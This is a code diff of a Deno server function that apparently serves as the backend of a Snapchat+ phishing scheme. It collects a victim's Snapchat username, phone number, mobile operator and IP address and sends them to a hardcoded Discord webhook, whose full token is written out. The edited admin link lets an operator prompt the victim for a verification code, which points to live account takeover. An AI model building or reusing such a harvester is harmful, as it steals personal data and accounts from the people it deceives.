@@ -1,12 +1,13 @@
+import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
+
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1513598405744787527/OfecKTmHVNK-0sUDt3f7n5PLo8qjUAkFgcOxtUZ95NKlzBqF_uSvfq7_9x1De-k9YxwW";
 
 Deno.serve(async (req) => {
+  const base44 = createClientFromRequest(req);
   const body = await req.json();
   const { snapchat, telephone, operateur, submissionId } = body;
 
-  // Get IP from headers
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
-
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
 
   const now = new Date();
@@ -16,8 +17,9 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-  const appUrl = req.headers.get("origin") || "https://yourapp.base44.app";
-  const codePageUrl = `${appUrl}/?step=code&snap=${encodeURIComponent(snapchat)}&tel=${encodeURIComponent(telephone)}`;
+  // URL to trigger code page for the user via admin panel
+  const appUrl = req.headers.get("origin") || "https://app.base44.app";
+  const sendCodeUrl = `${appUrl}/admin?action=send_code&id=${submissionId}`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -30,7 +32,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [Envoyer le code](${codePageUrl})\n❌ **Mauvais numéro**\n⏳ **Faire patienter**`,
+        value: `✅ [**Envoyer le code**](${sendCodeUrl})\n❌ **Mauvais numéro**\n⏳ **Faire patienter**`,
         inline: false
       },
     ],
